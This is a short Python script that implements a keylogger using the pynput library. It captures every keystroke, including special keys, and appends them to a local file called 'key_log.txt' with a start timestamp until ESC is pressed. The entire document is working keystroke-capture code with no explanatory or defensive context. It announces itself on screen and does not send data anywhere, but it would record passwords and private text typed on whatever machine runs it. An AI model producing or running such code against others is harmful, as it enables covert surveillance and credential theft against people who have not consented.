from pynput import keyboard
import datetime

log_file = "key_log.txt"

def write_log(text):
    with open(log_file, "a") as f:
        f.write(text)

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_log(key.char) 
        else:
            special_key = str(key).replace("Key.", "").upper()
            write_log(f" [{special_key}] ")  
    except Exception as e:
        write_log(f" [ERROR: {e}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False 

def main():
    print("Keylogger started. Press ESC to stop.")
    write_log(f"\n--- Logging started at {datetime.datetime.now()} ---\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
